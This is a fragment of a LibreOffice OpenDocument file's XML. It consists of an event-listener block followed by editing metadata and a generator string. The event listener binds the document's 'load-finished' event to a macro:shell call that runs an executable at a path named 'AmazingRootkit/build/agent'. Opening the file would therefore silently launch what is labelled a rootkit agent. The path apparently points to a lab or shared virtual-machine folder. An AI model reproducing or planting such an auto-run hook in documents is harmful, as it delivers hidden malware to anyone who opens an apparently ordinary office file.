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load-finished" xlink:href="macro:shell(%22/mnt/hgfs/AmazingRootkit/build/agent%22)" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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0:09.764183539</meta:creation-date>
    <dc:date>2023-03-20T12:48:28.596371217</dc:date>
    <meta:editing-duration>PT2M36S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/6.3.0.1$Linux_X86_64 LibreOffice_project/41ac97386aba908b6db860cfb4cfe2da871886a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